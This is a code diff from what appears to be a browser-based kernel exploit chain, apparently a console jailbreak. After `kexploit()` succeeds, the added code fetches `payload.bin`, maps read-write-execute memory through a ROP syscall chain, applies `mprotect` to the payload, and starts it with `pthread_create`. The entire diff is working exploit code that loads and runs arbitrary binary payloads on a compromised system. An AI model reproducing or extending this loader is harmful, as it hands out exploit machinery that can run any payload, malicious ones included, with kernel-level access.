@@ -1923,7 +1923,7 @@ function array_from_address(addr, size) {
 
 kexploit().then(() => {
 
- const PROT_READ = 1;
+ /*const PROT_READ = 1;
  const PROT_WRITE = 2;
  const PROT_EXEC = 4;
 
@@ -1961,5 +1961,39 @@ var loader_addr = chain.sysp(
 
    }
  };
+*/
 
+const PROT_READ = 1;
+const PROT_WRITE = 2;
+const PROT_EXEC = 4;
+
+fetch('./payload.bin').then(res => {
+    res.arrayBuffer().then(arr => {
+ 
+        const originalLength = arr.byteLength;
+        const padding = new Uint8Array((4 - (originalLength % 4)) % 4); // da 0 a 3 byte
+        const paddedBuffer = new Uint8Array(originalLength + padding.length);
+        paddedBuffer.set(new Uint8Array(arr), 0);
+        paddedBuffer.set(padding, originalLength);
+        const payload_loader = new Uint32Array(paddedBuffer.buffer);
+
+        
+        const payload_buffer = chain.sysp('mmap', new Int(0x26200000, 0x9), 0x300000, PROT_READ | PROT_WRITE | PROT_EXEC, 0x41000, -1, 0);
+
+       
+        chain.sys('mprotect', payload_loader.addr, payload_loader.length * 4, PROT_READ | PROT_WRITE | PROT_EXEC);
+
+        const ctx = new Buffer(0x10);
+        const pthread = new Pointer();
+        pthread.ctx = ctx;
+
+        call_nze(
+            'pthread_create',
+            pthread.addr,
+            0,
+            payload_loader.addr,
+            payload_buffer,
+        );
+    });
+});
 })
